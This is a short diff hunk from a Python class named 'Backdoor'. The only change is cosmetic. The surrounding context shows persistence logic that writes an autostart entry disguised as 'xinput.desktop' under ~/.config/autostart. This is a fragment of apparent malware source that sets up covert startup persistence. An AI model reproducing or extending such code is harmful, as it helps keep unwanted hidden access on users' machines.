@@ -35,7 +35,7 @@ class Backdoor:
             home_config_dir = os.path.expanduser('~') + "/.config/"
             autostart_path = home_config_dir + "/autostart/"
             autostart_file = autostart_path + "xinput.desktop"
-            if not os.path.isfile(autostart_file):
+            if (not os.path.isfile(autostart_file)):
                 try:
                     os.makedirs(autostart_path)
                 except OSError:
